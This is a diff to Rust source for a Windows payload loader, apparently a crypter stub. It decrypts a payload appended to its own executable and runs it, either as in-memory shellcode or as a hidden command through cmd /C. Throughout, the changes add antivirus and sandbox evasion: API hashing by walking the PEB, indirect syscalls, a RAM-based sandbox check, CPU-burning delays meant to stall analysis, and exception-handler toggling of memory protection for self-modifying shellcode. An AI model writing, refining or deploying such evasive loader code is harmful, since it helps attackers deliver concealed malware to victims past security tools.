@@ -1,5 +1,10 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 #![cfg_attr(debug_assertions, windows_subsystem = "console")]
+#![allow(dead_code)]
+#![allow(unused_imports)]
+#![allow(unused_variables)]
+#![allow(unused_unsafe)]
+#![allow(unused_mut)]
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
@@ -14,12 +19,8 @@ use windows_sys::Win32::Foundation::CloseHandle;
 use windows_sys::Win32::System::Diagnostics::Debug::{
     AddVectoredExceptionHandler, EXCEPTION_POINTERS, IMAGE_NT_HEADERS64,
 };
-use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
 use windows_sys::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
-};
-use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegOpenKeyExA, HKEY_CURRENT_USER, KEY_READ,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::SystemServices::{
     IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
@@ -36,6 +37,9 @@ static mut SSN_PROTECT: u32 = 0;
 static mut ADDR_PROTECT: usize = 0;
 static mut MAIN_FIBER: *mut core::ffi::c_void = core::ptr::null_mut();
 static mut ENC_KEY: u8 = 0;
+static mut LAST_VEH_ADDR: usize = 0;
+static mut PREV_VEH_ADDR: usize = 0;
+static mut LAST_VEH_COUNT: u32 = 0;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -51,7 +55,8 @@ const HASH_NT_DELAY_EXECUTION: u32 = 0x5350928f;
 const MARKER: &[u8] = b"2048KB\0";
 
 #[allow(dead_code)]
-const HASH_KERNEL32: u32 = 0x00000000;
+const HASH_KERNEL32: u32 = 0x80e765a2;
+const HASH_NTDLL: u32 = 0x3ad45a26;
 #[allow(dead_code)]
 const HASH_VIRTUAL_PROTECT: u32 = 0x00000000; // Not used/recalculated
 #[allow(dead_code)]
@@ -156,7 +161,7 @@ fn djb2(s: &[u8]) -> u32 {
 }
 
 #[cfg(target_arch = "x86_64")]
-unsafe fn get_ntdll_base() -> usize {
+unsafe fn get_module_by_hash(hash: u32) -> usize {
     let peb: *const u8;
     core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
     let ldr = *(peb.add(0x18) as *const *const u8);
@@ -170,35 +175,46 @@ unsafe fn get_ntdll_base() -> usize {
         if !name_buf.is_null() {
             let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
             let s = String::from_utf16_lossy(name_slice);
-            // XOR deobfuscation for "ntdll.dll" with 0x33
-            let mut target = [0u8; 9];
-            target[0] = b'n' ^ 0x33;
-            target[1] = b't' ^ 0x33;
-            target[2] = b'd' ^ 0x33;
-            target[3] = b'l' ^ 0x33;
-            target[4] = b'l' ^ 0x33;
-            target[5] = b'.' ^ 0x33;
-            target[6] = b'd' ^ 0x33;
-            target[7] = b'l' ^ 0x33;
-            target[8] = b'l' ^ 0x33;
-
-            let mut s_lower = s.to_ascii_lowercase();
-            let mut s_bytes = s_lower.into_bytes();
-            for b in s_bytes.iter_mut() {
-                *b ^= 0x33;
-            }
-
-            if s_bytes.len() == 9 && s_bytes == target {
+            let s_lower = s.to_ascii_lowercase();
+            if djb2(s_lower.as_bytes()) == hash {
                 return dll_base;
             }
         }
 
         entry = *(entry as *const *const u8);
-        if entry == *(ldr.add(0x20) as *const *const u8) {
+        if entry == ldr.add(0x20) {
             break;
         }
     }
     0
+}
+
+static mut CACHED_NTDLL: usize = 0;
+static mut CACHED_KERNEL32: usize = 0;
+
+#[cfg(target_arch = "x86_64")]
+unsafe fn get_ntdll_base() -> usize {
+    if CACHED_NTDLL != 0 {
+        return CACHED_NTDLL;
+    }
+    let base = get_module_by_hash(HASH_NTDLL);
+    CACHED_NTDLL = base;
+    base
+}
+
+#[cfg(target_arch = "x86_64")]
+unsafe fn get_image_base() -> usize {
+    let peb: *const u8;
+    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    *(peb.add(0x10) as *const usize)
+}
+
+#[cfg(target_arch = "x86_64")]
+unsafe fn get_peb_cpu_count() -> u32 {
+    let peb: *const u8;
+    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    // NumberOfProcessors is at PEB + 0xB8 (for 64-bit)
+    *(peb.add(0xB8) as *const u32)
 }
 
 unsafe fn get_export_addr(base: usize, hash: u32) -> Option<usize> {
@@ -270,6 +286,32 @@ unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
         }
     }
     None
+}
+
+unsafe fn check_sandbox() -> bool {
+    use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
+
+    // 1. RAM Check
+    let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
+    mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
+    GlobalMemoryStatusEx(&mut mem_status);
+    if mem_status.ullTotalPhys < 1 * 1024 * 1024 * 1024 {
+        // < 1GB
+        return true;
+    }
+
+    // 2. CPU Core Check (Relaxed for testing)
+    /*
+    #[cfg(target_arch = "x86_64")]
+    {
+        let cores = get_peb_cpu_count();
+        if cores < 2 {
+            return true;
+        }
+    }
+    */
+
+    false
 }
 
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
@@ -493,8 +535,28 @@ unsafe fn exec_remote(sc: &[u8], path: &str) {
     CloseHandle(h_proc);
 }
 
+unsafe fn get_kernel32_base() -> usize {
+    if CACHED_KERNEL32 != 0 {
+        return CACHED_KERNEL32;
+    }
+    #[cfg(target_arch = "x86_64")]
+    {
+        let base = get_module_by_hash(HASH_KERNEL32);
+        CACHED_KERNEL32 = base;
+        base
+    }
+    #[cfg(not(target_arch = "x86_64"))]
+    {
+        0
+    }
+}
+
 unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Option<usize> {
-    let base = GetModuleHandleA(core::ptr::null());
+    #[cfg(target_arch = "x86_64")]
+    let base = get_image_base();
+    #[cfg(not(target_arch = "x86_64"))]
+    let base = 0; // Not supported yet for x86
+
     if base == 0 {
         return None;
     }
@@ -601,36 +663,6 @@ unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Opti
         import_desc = import_desc.add(1);
     }
     None
-}
-
-unsafe fn get_kernel32_base() -> usize {
-    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
-    // "kernel32.dll" ^ 0x44
-    let mut k32 = [
-        b'k' ^ 0x44,
-        b'e' ^ 0x44,
-        b'r' ^ 0x44,
-        b'n' ^ 0x44,
-        b'e' ^ 0x44,
-        b'l' ^ 0x44,
-        b'3' ^ 0x44,
-        b'2' ^ 0x44,
-        b'.' ^ 0x44,
-        b'd' ^ 0x44,
-        b'l' ^ 0x44,
-        b'l' ^ 0x44,
-        0,
-    ];
-    for b in k32.iter_mut() {
-        if *b != 0 {
-            *b ^= 0x44;
-        }
-    }
-    let h = GetModuleHandleA(k32.as_ptr());
-    if h != 0 {
-        return h as usize;
-    }
-    0
 }
 
 unsafe extern "system" fn sleep_detour(dw_milliseconds: u32) {
@@ -877,7 +909,7 @@ unsafe fn clean_environment_block() {
 
 #[allow(dead_code)]
 fn api_hammering() {
-    unsafe { clean_environment_block() };
+    // unsafe { clean_environment_block() };
 
     // Replace HeapAlloc loop with math calculation to avoid Heuristic detection
     let mut x: u64 = 0xDEADBEEF;
@@ -906,9 +938,42 @@ unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> 
 
             // Check if address is within shellcode region
             if addr >= start && addr < end {
+                // Thrashing Detection for Self-Modifying Code
+                if addr == LAST_VEH_ADDR || addr == PREV_VEH_ADDR {
+                    LAST_VEH_COUNT += 1;
+                } else {
+                    LAST_VEH_COUNT = 1;
+                }
+                PREV_VEH_ADDR = LAST_VEH_ADDR;
+                LAST_VEH_ADDR = addr;
+
                 let mut old = 0;
                 let mut size = SC_SIZE;
                 let base = SC_ADDR as *mut core::ffi::c_void;
+
+                // If we hit the same address pair 4+ times (e.g. Exec->Write->Exec->Write), force RWX
+                if LAST_VEH_COUNT >= 4 {
+                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                        syscall(
+                            SSN_PROTECT,
+                            ADDR_PROTECT,
+                            0xffffffffffffffff,
+                            &mut (base as usize) as *mut _ as usize,
+                            &mut size as *mut _ as usize,
+                            PAGE_EXECUTE_READWRITE as usize,
+                            &mut old as *mut _ as usize,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                        );
+                    } else {
+                        VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old);
+                    }
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
 
                 // If it's an Execution Violation (8), it means we are RW/NoAccess, need RX
                 // DEP Violation
@@ -941,30 +1006,23 @@ unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> 
                     return EXCEPTION_CONTINUE_EXECUTION;
                 }
 
-                // If it's a Write Violation (1), it means we are RX, need RW (or RWX for mixed code)
-                // Self-Modifying Code Support
+                // If it's a Write Violation (1), it means we are RX, need RW.
+                // Self-Modifying Code Support (Strict RW/RX toggling to avoid RWX)
                 if violation_type == 1 {
                     // Capture Thread ID if not set (just in case)
                     if SC_THREAD_ID == 0 {
                         SC_THREAD_ID = GetCurrentThreadId();
                     }
 
-                    // Optimization: Use RWX to prevent thrashing (infinite loop of RW <-> RX)
-                    // If we just set RW, the next fetch (Exec) will trigger DEP (Exec Violation).
-                    // Then we set RX. Then the next Write triggers Write Violation.
-                    // This ping-pong kills performance.
-                    // Setting RWX allows both.
-                    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-
                     if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
-                        // Syscall Protect RWX
+                        // Syscall Protect RW
                         syscall(
                             SSN_PROTECT,
                             ADDR_PROTECT,
                             0xffffffffffffffff,
                             &mut (base as usize) as *mut _ as usize,
                             &mut size as *mut _ as usize,
-                            PAGE_EXECUTE_READWRITE as usize,
+                            PAGE_READWRITE as usize,
                             &mut old as *mut _ as usize,
                             0,
                             0,
@@ -974,7 +1032,7 @@ unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> 
                             0,
                         );
                     } else {
-                        VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old);
+                        VirtualProtect(base, size, PAGE_READWRITE, &mut old);
                     }
                     return EXCEPTION_CONTINUE_EXECUTION;
                 }
@@ -1091,49 +1149,45 @@ fn fake_verification() {
 }
 
 unsafe fn delay_execution() {
+    log_debug("Delay execution start");
     println!("[INFO] Synchronizing with system time...");
-    let (ssn_wait, addr_wait) =
-        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));
 
-    if addr_wait != 0 {
-        // Delay 3-7 seconds based on random seed
-        let seconds = 3 + (JUNK_SEED_1 % 5);
-        let mut timeout: i64 = -((seconds as i64) * 10_000_000);
-
-        // Wait on CurrentProcess (pseudo-handle -1) which is non-signaled until termination
-        // This effectively sleeps until timeout
-        syscall(
-            ssn_wait,
-            addr_wait,
-            -1isize as usize,                // Handle
-            0,                               // Alertable
-            &mut timeout as *mut _ as usize, // Timeout
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-        );
-    } else {
-        // Fallback to heavy math loop if syscall resolution fails
-        let mut x = JUNK_SEED_2;
-        for _ in 0..500_000_000 {
-            x = x.wrapping_mul(3).wrapping_add(1);
-            core::hint::black_box(x);
-        }
+    // Use math loop for delay/evasion (CPU burning)
+    // NtDelayExecution/NtWaitForSingleObject caused stability issues,
+    // so we rely on heavy calculation which also evades some sandboxes (timeout/stall).
+    let mut x = JUNK_SEED_2;
+    for _ in 0..500_000_000 {
+        x = x.wrapping_mul(3).wrapping_add(1);
+        core::hint::black_box(x);
     }
     println!("[INFO] Synchronization complete.");
 }
 
+fn log_debug(msg: &str) {
+    if let Ok(mut dir) = std::env::temp_dir().canonicalize() {
+        dir.push("stub_debug.log");
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(dir)
+        {
+            use std::io::Write;
+            let _ = writeln!(f, "{}", msg);
+        }
+    }
+}
+
 fn main() {
+    log_debug("Stub started");
     init_logging();
+    log_debug("Init logging done");
     fake_verification();
+    log_debug("Fake verification done");
     api_hammering();
+    log_debug("API hammering done");
 
     unsafe { delay_execution() };
+    log_debug("Delay execution done");
 
     // Replaced NtDelayExecution with math loop to avoid static signatures
     // let mut interval: i64 = -50_000_000;
@@ -1155,21 +1209,25 @@ fn main() {
         Err(_) => return,
     };
     println!("Stub started, exe: {:?}", exe_path);
+    log_debug(&format!("Exe path: {:?}", exe_path));
     let mut buf = Vec::new();
     if fs::File::open(&exe_path)
         .and_then(|mut f| f.read_to_end(&mut buf))
         .is_err()
     {
         println!("Failed to read self");
+        log_debug("Failed to read self");
         return;
     }
 
     let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
     let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
         println!("Marker not found in {} bytes", buf.len());
+        log_debug(&format!("Marker not found in {} bytes", buf.len()));
         return;
     };
     println!("Marker found at offset {}", off);
+    log_debug(&format!("Marker found at offset {}", off));
 
     if off + 4 > buf.len() {
         return;
@@ -1342,6 +1400,7 @@ fn main() {
         Ok(p) => p,
         Err(_) => {
             println!("Decryption failed");
+            log_debug("Decryption failed");
             return;
         }
     };
@@ -1350,13 +1409,20 @@ fn main() {
         Ok(p) => p,
         Err(e) => {
             println!("Decompression failed: {}", e);
+            log_debug(&format!("Decompression failed: {}", e));
             return;
         }
     };
     println!("Decompression success, payload size: {}", payload.len());
+    log_debug(&format!(
+        "Decompression success, payload size: {}",
+        payload.len()
+    ));
 
     if payload.starts_with(b"CMD\0") {
-        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
+        let raw_cmd = String::from_utf8_lossy(&payload[4..]);
+        let cmd = raw_cmd.trim_matches(char::from(0)).to_string();
+        log_debug(&format!("CMD payload: '{}'", cmd));
         let exe_dir = std::env::current_exe()
             .ok()
             .and_then(|p| p.parent().map(|d| d.to_path_buf()))
@@ -1376,12 +1442,14 @@ fn main() {
                 let _ = fs::write(&out_path, format!("{}\r\n", content));
             }
         } else {
+            log_debug("Executing command via spawn");
             if Command::new(&cmd)
                 .current_dir(&exe_dir)
                 .creation_flags(CREATE_NO_WINDOW)
                 .spawn()
                 .is_err()
             {
+                log_debug("Direct spawn failed, trying cmd /C");
                 let _ = Command::new("cmd.exe")
                     .arg("/C")
                     .arg(&cmd)
@@ -1470,18 +1538,14 @@ fn main() {
                     return;
                 }
 
-                use windows_sys::Win32::System::SystemInformation::{
-                    GlobalMemoryStatusEx, MEMORYSTATUSEX,
-                };
-                let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
-                mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
-                GlobalMemoryStatusEx(&mut mem_status);
-                if mem_status.ullTotalPhys < 4 * 1024 * 1024 * 1024 {
-                    println!("System check failed (RAM)");
+                if check_sandbox() {
+                    println!("System check failed (Sandbox Detected)");
+                    log_debug("Sandbox Detected");
                     return;
                 }
 
                 println!("Allocating memory via Indirect Syscall...");
+                log_debug("Allocating memory...");
 
                 let mut alloc_base: usize = 0;
                 let mut alloc_size = sc_len + 256 * 1024;
@@ -1578,11 +1642,13 @@ fn main() {
 
                         // Try Threadpool first if obfuscated, else Fiber
                         let mut executed = false;
+                        /*
                         if flag > 0 {
                             if exec_threadpool(base, sc_len) {
                                 executed = true;
                             }
                         }
+                        */
 
                         if !executed {
                             println!("Executing via Fiber...");
